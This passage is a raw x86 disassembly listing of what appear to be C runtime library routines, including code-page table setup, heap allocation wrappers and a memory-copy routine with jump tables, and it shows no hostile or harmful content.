  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
  4241f2:	push   esi
  4241f3:	call   DWORD PTR ds:0x4280a4
  4241f9:	cmp    eax,0x1
  4241fc:	jne    0x424323
  424202:	push   0x40
  424204:	xor    eax,eax
  424206:	cmp    DWORD PTR [ebp-0x1c],0x1
  42420a:	pop    ecx
  42420b:	mov    edi,0x45cf20
  424210:	rep stos DWORD PTR es:[edi],eax
  424212:	stos   BYTE PTR es:[edi],al
  424213:	mov    DWORD PTR ds:0x45d024,esi
  424219:	mov    DWORD PTR ds:0x45cf14,ebx
  42421f:	jbe    0x424311
  424225:	cmp    BYTE PTR [ebp-0x16],0x0
  424229:	je     0x4242e9
  42422f:	lea    ecx,[ebp-0x15]
  424232:	mov    dl,BYTE PTR [ecx]
  424234:	test   dl,dl
  424236:	je     0x4242e9
  42423c:	movzx  eax,BYTE PTR [ecx-0x1]
  424240:	movzx  edx,dl
  424243:	jmp    0x4242d9
  424248:	push   0x40
  42424a:	xor    eax,eax
  42424c:	pop    ecx
  42424d:	mov    edi,0x45cf20
  424252:	rep stos DWORD PTR es:[edi],eax
  424254:	lea    ecx,[edx+edx*2]
  424257:	shl    ecx,0x4
  42425a:	mov    DWORD PTR [ebp-0x8],ebx
  42425d:	stos   BYTE PTR es:[edi],al
  42425e:	lea    ebx,[ecx+0x45c450]
  424264:	mov    al,BYTE PTR [ebx]
  424266:	mov    esi,ebx
  424268:	jmp    0x424293
  42426a:	mov    dl,BYTE PTR [esi+0x1]
  42426d:	test   dl,dl
  42426f:	je     0x424297
  424271:	movzx  eax,al
  424274:	movzx  edi,dl
  424277:	cmp    eax,edi
  424279:	ja     0x42428f
  42427b:	mov    edx,DWORD PTR [ebp-0x8]
  42427e:	mov    dl,BYTE PTR [edx+0x45c438]
  424284:	or     BYTE PTR [eax+0x45cf21],dl
  42428a:	inc    eax
  42428b:	cmp    eax,edi
  42428d:	jbe    0x424284
  42428f:	inc    esi
  424290:	inc    esi
  424291:	mov    al,BYTE PTR [esi]
  424293:	test   al,al
  424295:	jne    0x42426a
  424297:	inc    DWORD PTR [ebp-0x8]
  42429a:	add    ebx,0x8
  42429d:	cmp    DWORD PTR [ebp-0x8],0x4
  4242a1:	jb     0x424264
  4242a3:	mov    eax,DWORD PTR [ebp+0x8]
  4242a6:	mov    ds:0x45d024,eax
  4242ab:	mov    DWORD PTR ds:0x45cf1c,0x1
  4242b5:	call   0x423fcc
  4242ba:	lea    ecx,[ecx+0x45c444]
  4242c0:	mov    esi,ecx
  4242c2:	mov    edi,0x45d030
  4242c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c9:	mov    ds:0x45cf14,eax
  4242ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242cf:	jmp    0x424330
  4242d1:	or     BYTE PTR [eax+0x45cf21],0x4
  4242d8:	inc    eax
  4242d9:	cmp    eax,edx
  4242db:	jbe    0x4242d1
  4242dd:	inc    ecx
  4242de:	inc    ecx
  4242df:	cmp    BYTE PTR [ecx-0x1],0x0
  4242e3:	jne    0x424232
  4242e9:	xor    ecx,ecx
  4242eb:	inc    ecx
  4242ec:	mov    eax,ecx
  4242ee:	or     BYTE PTR [eax+0x45cf21],0x8
  4242f5:	inc    eax
  4242f6:	cmp    eax,0xff
  4242fb:	jb     0x4242ee
  4242fd:	mov    eax,esi
  4242ff:	call   0x423fcc
  424304:	mov    ds:0x45cf14,eax
  424309:	mov    DWORD PTR ds:0x45cf1c,ecx
  42430f:	jmp    0x424317
  424311:	mov    DWORD PTR ds:0x45cf1c,ebx
  424317:	xor    eax,eax
  424319:	mov    edi,0x45d030
  42431e:	stos   DWORD PTR es:[edi],eax
  42431f:	stos   DWORD PTR es:[edi],eax
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	jmp    0x424330
  424323:	cmp    DWORD PTR ds:0x45cd84,ebx
  424329:	je     0x424339
  42432b:	call   0x423ffb
  424330:	call   0x424024
  424335:	xor    eax,eax
  424337:	jmp    0x42433c
  424339:	or     eax,0xffffffff
  42433c:	mov    ecx,DWORD PTR [ebp-0x4]
  42433f:	xor    ecx,DWORD PTR [ebp+0x4]
  424342:	pop    edi
  424343:	pop    esi
  424344:	pop    ebx
  424345:	call   0x423f7c
  42434a:	leave  
  42434b:	ret    
  42434c:	push   0x14
  42434e:	push   0x428558
  424353:	call   0x4238a8
  424358:	or     DWORD PTR [ebp-0x1c],0xffffffff
  42435c:	push   0xd
  42435e:	call   0x423a6f
  424363:	pop    ecx
  424364:	xor    edi,edi
  424366:	mov    DWORD PTR [ebp-0x4],edi
  424369:	mov    DWORD PTR ds:0x45cd84,edi
  42436f:	mov    eax,DWORD PTR [ebp+0x8]
  424372:	cmp    eax,0xfffffffe
  424375:	jne    0x424389
  424377:	mov    DWORD PTR ds:0x45cd84,0x1
  424381:	call   DWORD PTR ds:0x4280a0
  424387:	jmp    0x4243b4
  424389:	cmp    eax,0xfffffffd
  42438c:	jne    0x4243a0
  42438e:	mov    DWORD PTR ds:0x45cd84,0x1
  424398:	call   DWORD PTR ds:0x42809c
  42439e:	jmp    0x4243b4
  4243a0:	cmp    eax,0xfffffffc
  4243a3:	jne    0x4243b4
  4243a5:	mov    DWORD PTR ds:0x45cd84,0x1
  4243af:	mov    eax,ds:0x45cdb4
  4243b4:	mov    DWORD PTR [ebp+0x8],eax
  4243b7:	cmp    eax,DWORD PTR ds:0x45d024
  4243bd:	je     0x42447e
  4243c3:	mov    esi,DWORD PTR ds:0x45cf18
  4243c9:	mov    DWORD PTR [ebp-0x20],esi
  4243cc:	cmp    esi,edi
  4243ce:	je     0x4243d4
  4243d0:	cmp    DWORD PTR [esi],edi
  4243d2:	je     0x4243e4
  4243d4:	push   0x220
  4243d9:	call   0x4245d2
  4243de:	pop    ecx
  4243df:	mov    esi,eax
  4243e1:	mov    DWORD PTR [ebp-0x20],esi
  4243e4:	cmp    esi,edi
  4243e6:	je     0x424467
  4243e8:	push   DWORD PTR [ebp+0x8]
  4243eb:	call   0x4241b6
  4243f0:	pop    ecx
  4243f1:	mov    DWORD PTR [ebp-0x1c],eax
  4243f4:	cmp    eax,edi
  4243f6:	jne    0x424467
  4243f8:	mov    DWORD PTR [esi],edi
  4243fa:	mov    eax,ds:0x45d024
  4243ff:	mov    DWORD PTR [esi+0x4],eax
  424402:	mov    eax,ds:0x45cf1c
  424407:	mov    DWORD PTR [esi+0x8],eax
  42440a:	mov    eax,ds:0x45cf14
  42440f:	mov    DWORD PTR [esi+0xc],eax
  424412:	xor    eax,eax
  424414:	mov    DWORD PTR [ebp-0x24],eax
  424417:	cmp    eax,0x5
  42441a:	jge    0x42442c
  42441c:	mov    cx,WORD PTR [eax*2+0x45d030]
  424424:	mov    WORD PTR [esi+eax*2+0x10],cx
  424429:	inc    eax
  42442a:	jmp    0x424414
  42442c:	xor    eax,eax
  42442e:	mov    DWORD PTR [ebp-0x24],eax
  424431:	cmp    eax,0x101
  424436:	jge    0x424445
  424438:	mov    cl,BYTE PTR [eax+0x45cf20]
  42443e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  424442:	inc    eax
  424443:	jmp    0x42442e
  424445:	xor    eax,eax
  424447:	mov    DWORD PTR [ebp-0x24],eax
  42444a:	cmp    eax,0x100
  42444f:	jge    0x424461
  424451:	mov    cl,BYTE PTR [eax+0x45d040]
  424457:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  42445e:	inc    eax
  42445f:	jmp    0x424447
  424461:	mov    DWORD PTR ds:0x45cf18,esi
  424467:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  42446b:	jne    0x424481
  42446d:	cmp    esi,DWORD PTR ds:0x45cf18
  424473:	je     0x424481
  424475:	push   esi
  424476:	call   0x4244ba
  42447b:	pop    ecx
  42447c:	jmp    0x424481
  42447e:	mov    DWORD PTR [ebp-0x1c],edi
  424481:	or     DWORD PTR [ebp-0x4],0xffffffff
  424485:	call   0x424493
  42448a:	mov    eax,DWORD PTR [ebp-0x1c]
  42448d:	call   0x4238e3
  424492:	ret    
  424493:	push   0xd
  424495:	call   0x4239db
  42449a:	pop    ecx
  42449b:	ret    
  42449c:	cmp    DWORD PTR ds:0x45d26c,0x0
  4244a3:	jne    0x4244b7
  4244a5:	push   0xfffffffd
  4244a7:	call   0x42434c
  4244ac:	pop    ecx
  4244ad:	mov    DWORD PTR ds:0x45d26c,0x1
  4244b7:	xor    eax,eax
  4244b9:	ret    
  4244ba:	push   0xc
  4244bc:	push   0x428568
  4244c1:	call   0x4238a8
  4244c6:	mov    esi,DWORD PTR [ebp+0x8]
  4244c9:	test   esi,esi
  4244cb:	je     0x424525
  4244cd:	cmp    DWORD PTR ds:0x45d144,0x3
  4244d4:	jne    0x424516
  4244d6:	push   0x4
  4244d8:	call   0x423a6f
  4244dd:	pop    ecx
  4244de:	and    DWORD PTR [ebp-0x4],0x0
  4244e2:	push   esi
  4244e3:	call   0x424c92
  4244e8:	pop    ecx
  4244e9:	mov    DWORD PTR [ebp-0x1c],eax
  4244ec:	test   eax,eax
  4244ee:	je     0x4244f9
  4244f0:	push   esi
  4244f1:	push   eax
  4244f2:	call   0x424cbd
  4244f7:	pop    ecx
  4244f8:	pop    ecx
  4244f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4244fd:	call   0x42450d
  424502:	cmp    DWORD PTR [ebp-0x1c],0x0
  424506:	jne    0x424525
  424508:	push   DWORD PTR [ebp+0x8]
  42450b:	jmp    0x424517
  42450d:	push   0x4
  42450f:	call   0x4239db
  424514:	pop    ecx
  424515:	ret    
  424516:	push   esi
  424517:	push   0x0
  424519:	push   DWORD PTR ds:0x45d140
  42451f:	call   DWORD PTR ds:0x42808c
  424525:	call   0x4238e3
  42452a:	ret    
  42452b:	push   0xc
  42452d:	push   0x428578
  424532:	call   0x4238a8
  424537:	mov    esi,DWORD PTR [ebp+0x8]
  42453a:	cmp    DWORD PTR ds:0x45d144,0x3
  424541:	jne    0x424571
  424543:	cmp    esi,DWORD PTR ds:0x45cf04
  424549:	ja     0x424571
  42454b:	push   0x4
  42454d:	call   0x423a6f
  424552:	pop    ecx
  424553:	and    DWORD PTR [ebp-0x4],0x0
  424557:	push   esi
  424558:	call   0x425471
  42455d:	pop    ecx
  42455e:	mov    DWORD PTR [ebp-0x1c],eax
  424561:	or     DWORD PTR [ebp-0x4],0xffffffff
  424565:	call   0x42459d
  42456a:	mov    eax,DWORD PTR [ebp-0x1c]
  42456d:	test   eax,eax
  42456f:	jne    0x424594
  424571:	test   esi,esi
  424573:	jne    0x424576
  424575:	inc    esi
  424576:	cmp    DWORD PTR ds:0x45d144,0x1
  42457d:	je     0x424585
  42457f:	add    esi,0xf
  424582:	and    esi,0xfffffff0
  424585:	push   esi
  424586:	push   0x0
  424588:	push   DWORD PTR ds:0x45d140
  42458e:	call   DWORD PTR ds:0x4280a8
  424594:	call   0x4238e3
  424599:	ret    
  42459a:	mov    esi,DWORD PTR [ebp+0x8]
  42459d:	push   0x4
  42459f:	call   0x4239db
  4245a4:	pop    ecx
  4245a5:	ret    
  4245a6:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  4245ab:	ja     0x4245cf
  4245ad:	push   DWORD PTR [esp+0x4]
  4245b1:	call   0x42452b
  4245b6:	test   eax,eax
  4245b8:	pop    ecx
  4245b9:	jne    0x4245d1
  4245bb:	cmp    DWORD PTR [esp+0x8],eax
  4245bf:	je     0x4245d1
  4245c1:	push   DWORD PTR [esp+0x4]
  4245c5:	call   0x426192
  4245ca:	test   eax,eax
  4245cc:	pop    ecx
  4245cd:	jne    0x4245ad
  4245cf:	xor    eax,eax
  4245d1:	ret    
  4245d2:	push   DWORD PTR ds:0x45cdc8
  4245d8:	push   DWORD PTR [esp+0x8]
  4245dc:	call   0x4245a6
  4245e1:	pop    ecx
  4245e2:	pop    ecx
  4245e3:	ret    
  4245e4:	int3   
  4245e5:	int3   
  4245e6:	int3   
  4245e7:	int3   
  4245e8:	int3   
  4245e9:	int3   
  4245ea:	int3   
  4245eb:	int3   
  4245ec:	int3   
  4245ed:	int3   
  4245ee:	int3   
  4245ef:	int3   
  4245f0:	push   ebp
  4245f1:	mov    ebp,esp
  4245f3:	push   edi
  4245f4:	push   esi
  4245f5:	mov    esi,DWORD PTR [ebp+0xc]
  4245f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4245fb:	mov    edi,DWORD PTR [ebp+0x8]
  4245fe:	mov    eax,ecx
  424600:	mov    edx,ecx
  424602:	add    eax,esi
  424604:	cmp    edi,esi
  424606:	jbe    0x424610
  424608:	cmp    edi,eax
  42460a:	jb     0x42478c
  424610:	test   edi,0x3
  424616:	jne    0x42462c
  424618:	shr    ecx,0x2
  42461b:	and    edx,0x3
  42461e:	cmp    ecx,0x8
  424621:	jb     0x42464c
  424623:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424625:	jmp    DWORD PTR [edx*4+0x42473c]
  42462c:	mov    eax,edi
  42462e:	mov    edx,0x3
  424633:	sub    ecx,0x4
  424636:	jb     0x424644
  424638:	and    eax,0x3
  42463b:	add    ecx,eax
  42463d:	jmp    DWORD PTR [eax*4+0x424650]
  424644:	jmp    DWORD PTR [ecx*4+0x42474c]
  42464b:	nop
  42464c:	jmp    DWORD PTR [ecx*4+0x4246d0]
  424653:	nop
  424654:	pusha  
  424655:	inc    esi
  424656:	inc    edx
  424657:	add    BYTE PTR [esi+eax*2+0x46b00042],cl
  42465e:	inc    edx
  42465f:	add    BYTE PTR [ebx],ah
  424661:	ror    DWORD PTR [edx-0x75f877fa],1
  424667:	inc    esi
  424668:	add    DWORD PTR [eax+0x468a0147],ecx
  42466e:	add    al,cl
  424670:	jmp    0x289ce77
  424675:	add    esi,0x3
  424678:	add    edi,0x3
  42467b:	cmp    ecx,0x8
  42467e:	jb     0x42464c
  424680:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424682:	jmp    DWORD PTR [edx*4+0x42473c]
  424689:	lea    ecx,[ecx+0x0]
  42468c:	and    edx,ecx
  42468e:	mov    al,BYTE PTR [esi]
  424690:	mov    BYTE PTR [edi],al
  424692:	mov    al,BYTE PTR [esi+0x1]
  424695:	shr    ecx,0x2
  424698:	mov    BYTE PTR [edi+0x1],al
  42469b:	add    esi,0x2
  42469e:	add    edi,0x2
  4246a1:	cmp    ecx,0x8
  4246a4:	jb     0x42464c
  4246a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246a8:	jmp    DWORD PTR [edx*4+0x42473c]
  4246af:	nop
  4246b0:	and    edx,ecx
  4246b2:	mov    al,BYTE PTR [esi]
  4246b4:	mov    BYTE PTR [edi],al
  4246b6:	add    esi,0x1
  4246b9:	shr    ecx,0x2
  4246bc:	add    edi,0x1
  4246bf:	cmp    ecx,0x8
  4246c2:	jb     0x42464c
  4246c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4246c6:	jmp    DWORD PTR [edx*4+0x42473c]
  4246cd:	lea    ecx,[ecx+0x0]
  4246d0:	xor    eax,DWORD PTR [edi+0x42]
  4246d3:	add    BYTE PTR [eax],ah
  4246d5:	inc    edi
  4246d6:	inc    edx
  4246d7:	add    BYTE PTR [eax],bl
  4246d9:	inc    edi
  4246da:	inc    edx
  4246db:	add    BYTE PTR [eax],dl
  4246dd:	inc    edi
  4246de:	inc    edx
  4246df:	add    BYTE PTR [eax],cl
  4246e1:	inc    edi
  4246e2:	inc    edx
  4246e3:	add    BYTE PTR [eax],al
  4246e5:	inc    edi
  4246e6:	inc    edx
  4246e7:	add    al,bh
  4246e9:	inc    esi
  4246ea:	inc    edx
  4246eb:	add    al,dh
  4246ed:	inc    esi
  4246ee:	inc    edx
  4246ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4246f5:	inc    esp
  4246f6:	(bad)  
  4246f7:	in     al,0x8b
  4246f9:	inc    esp
  4246fa:	mov    gs,eax
  4246fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  424700:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  424704:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  424708:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42470c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  424710:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  424714:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  424718:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42471c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  424720:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  424724:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  424728:	lea    eax,[ecx*4+0x0]
  42472f:	add    esi,eax
  424731:	add    edi,eax
  424733:	jmp    DWORD PTR [edx*4+0x42473c]
  42473a:	mov    edi,edi
  42473c:	dec    esp
  42473d:	inc    edi
  42473e:	inc    edx
  42473f:	add    BYTE PTR [edi+eax*2+0x42],dl
  424743:	add    BYTE PTR [eax+0x47],ah
  424746:	inc    edx
  424747:	add    BYTE PTR [edi+eax*2+0x42],dh
  42474b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  424751:	leave  
  424752:	ret    
  424753:	nop
  424754:	mov    al,BYTE PTR [esi]
  424756:	mov    BYTE PTR [edi],al
  424758:	mov    eax,DWORD PTR [ebp+0x8]
  42475b:	pop    esi
  42475c:	pop    edi
  42475d:	leave  
  42475e:	ret    
  42475f:	nop
  424760:	mov    al,BYTE PTR [esi]
  424762:	mov    BYTE PTR [edi],al
  424764:	mov    al,BYTE PTR [esi+0x1]
  424767:	mov    BYTE PTR [edi+0x1],al
  42476a:	mov    eax,DWORD PTR [ebp+0x8]
  42476d:	pop    esi
  42476e:	pop    edi
  42476f:	leave  
  424770:	ret    
  424771:	lea    ecx,[ecx+0x0]
  424774:	mov    al,BYTE PTR [esi]
  424776:	mov    BYTE PTR [edi],al
  424778:	mov    al,BYTE PTR [esi+0x1]
  42477b:	mov    BYTE PTR [edi+0x1],al
  42477e:	mov    al,BYTE PTR [esi+0x2]
  424781:	mov    BYTE PTR [edi+0x2],al
  424784:	mov    eax,DWORD PTR [ebp+0x8]
  424787:	pop    esi
  424788:	pop    edi
  424789:	leave  
  42478a:	ret    
  42478b:	nop
  42478c:	lea    esi,[ecx+esi*1-0x4]
  424790:	lea    edi,[ecx+edi*1-0x4]
  424794:	test   edi,0x3
  42479a:	jne    0x4247c0
  42479c:	shr    ecx,0x2
  42479f:	and    edx,0x3
  4247a2:	cmp    ecx,0x8
  4247a5:	jb     0x4247b4
  4247a7:	std    
  4247a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247aa:	cld    
  4247ab:	jmp    DWORD PTR [edx*4+0x4248d8]
  4247b2:	mov    edi,edi
  4247b4:	neg    ecx
  4247b6:	jmp    DWORD PTR [ecx*4+0x424888]
  4247bd:	lea    ecx,[ecx+0x0]
  4247c0:	mov    eax,edi
  4247c2:	mov    edx,0x3
  4247c7:	cmp    ecx,0x4
  4247ca:	jb     0x4247d8
  4247cc:	and    eax,0x3
  4247cf:	sub    ecx,eax
  4247d1:	jmp    DWORD PTR [eax*4+0x4247dc]
  4247d8:	jmp    DWORD PTR [ecx*4+0x4248d8]
  4247df:	nop
  4247e0:	in     al,dx
  4247e1:	inc    edi
  4247e2:	inc    edx
  4247e3:	add    BYTE PTR [eax],dl
  4247e5:	dec    eax
  4247e6:	inc    edx
  4247e7:	add    BYTE PTR [eax],bh
  4247e9:	dec    eax
  4247ea:	inc    edx
  4247eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4247f1:	mov    BYTE PTR [edi+0x3],al
  4247f4:	sub    esi,0x1
  4247f7:	shr    ecx,0x2
  4247fa:	sub    edi,0x1
  4247fd:	cmp    ecx,0x8
  424800:	jb     0x4247b4
  424802:	std    
  424803:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424805:	cld    
  424806:	jmp    DWORD PTR [edx*4+0x4248d8]
  42480d:	lea    ecx,[ecx+0x0]
  424810:	mov    al,BYTE PTR [esi+0x3]
  424813:	and    edx,ecx
  424815:	mov    BYTE PTR [edi+0x3],al
  424818:	mov    al,BYTE PTR [esi+0x2]
  42481b:	shr    ecx,0x2
  42481e:	mov    BYTE PTR [edi+0x2],al
  424821:	sub    esi,0x2
  424824:	sub    edi,0x2
  424827:	cmp    ecx,0x8
  42482a:	jb     0x4247b4
  42482c:	std    
  42482d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42482f:	cld    
  424830:	jmp    DWORD PTR [edx*4+0x4248d8]
  424837:	nop
  424838:	mov    al,BYTE PTR [esi+0x3]
  42483b:	and    edx,ecx
  42483d:	mov    BYTE PTR [edi+0x3],al
  424840:	mov    al,BYTE PTR [esi+0x2]
  424843:	mov    BYTE PTR [edi+0x2],al
  424846:	mov    al,BYTE PTR [esi+0x1]
  424849:	shr    ecx,0x2
  42484c:	mov    BYTE PTR [edi+0x1],al
  42484f:	sub    esi,0x3
  424852:	sub    edi,0x3
  424855:	cmp    ecx,0x8
  424858:	jb     0x4247b4
  42485e:	std    
  42485f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424861:	cld    
  424862:	jmp    DWORD PTR [edx*4+0x4248d8]
  424869:	lea    ecx,[ecx+0x0]
  42486c:	mov    WORD PTR [eax+0x42],cs
  42486f:	add    BYTE PTR [eax+ecx*2+0x489c0042],dl
  424876:	inc    edx
  424877:	add    BYTE PTR [eax+ecx*2+0x48ac0042],ah
  42487e:	inc    edx
  42487f:	add    BYTE PTR [eax+ecx*2+0x48bc0042],dh
  424886:	inc    edx
  424887:	add    bh,cl
  424889:	dec    eax
  42488a:	inc    edx
  42488b:	add    BYTE PTR [ebx-0x76e371bc],cl
  424891:	inc    esp
  424892:	(bad)  
  424893:	sbb    al,0x8b
  424895:	inc    esp
  424896:	mov    ds,WORD PTR [eax]
  424898:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42489c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  4248a0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  4248a4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  4248a8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  4248ac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  4248b0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  4248b4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  4248b8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  4248bc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4248c0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4248c4:	lea    eax,[ecx*4+0x0]
  4248cb:	add    esi,eax
  4248cd:	add    edi,eax
  4248cf:	jmp    DWORD PTR [edx*4+0x4248d8]
  4248d6:	mov    edi,edi
  4248d8:	call   0xf0428b25
  4248dd:	dec    eax
  4248de:	inc    edx
  4248df:	add    BYTE PTR [eax],al
  4248e1:	dec    ecx
  4248e2:	inc    edx
  4248e3:	add    BYTE PTR [ecx+ecx*2],dl
  4248e6:	inc    edx
  4248e7:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4248ed:	leave  
  4248ee:	ret    
  4248ef:	nop
  4248f0:	mov    al,BYTE PTR [esi+0x3]
  4248f3:	mov    BYTE PTR [edi+0x3],al
  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
